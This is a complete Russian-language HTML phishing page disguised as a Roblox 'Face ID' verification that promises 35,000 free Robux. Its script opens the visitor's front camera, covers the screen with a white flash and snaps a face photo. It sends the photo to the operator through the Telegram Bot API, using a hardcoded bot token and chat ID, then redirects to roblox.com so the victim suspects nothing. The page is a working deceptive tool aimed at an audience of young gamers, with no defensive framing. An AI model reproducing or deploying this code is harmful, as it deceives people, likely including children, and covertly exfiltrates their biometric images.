<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Verification</title>
    <style>
        body { font-family: sans-serif; background: #111; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #222; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; }
        .btn { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; z-index: 9999; }
    </style>
</head>
<body>

<div id="flash"></div> <div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1);">
    <h2>Face ID Проверка</h2>
    <p id="info">Для получения 35,000 Robux поднесите телефон к лицу и нажмите кнопку.</p>
    <button class="btn" onclick="capture()">ПОДТВЕРДИТЬ</button>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    async function capture() {
        const btn = document.querySelector('.btn');
        const info = document.getElementById('info');
        const flash = document.getElementById('flash');
        
        btn.style.display = 'none';
        info.innerText = "Идет сканирование... Смотрите в камеру";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 1280, height: 720 } 
            });
            const video = document.getElementById('v');
            video.srcObject = stream;

            // Ждем 3.5 секунды, чтобы камера настроила свет
            setTimeout(() => {
                // Эффект вспышки (экран станет белым на секунду)
                flash.style.display = 'block';
                
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', '7889497672');
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', '👤 ЛИЦО ПОЛУЧЕНО\n(с задержкой и вспышкой)');

                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                            method: 'POST',
                            body: fd
                        }).then(() => {
                            flash.style.display = 'none';
                            stream.getTracks().forEach(t => t.stop());
                            alert("Готово! Ожидайте зачисления.");
                            window.location.href = "https://www.roblox.com";
                        });
                    }, 'image/jpeg', 0.8);
                }, 200); // Снимок через 0.2 сек после включения вспышки
            }, 3500); // 3.5 секунды на подготовку камеры

        } catch (e) {
            alert("Разрешите камеру!");
            btn.style.display = 'block';
        }
    }
</script>
</body>
</html>
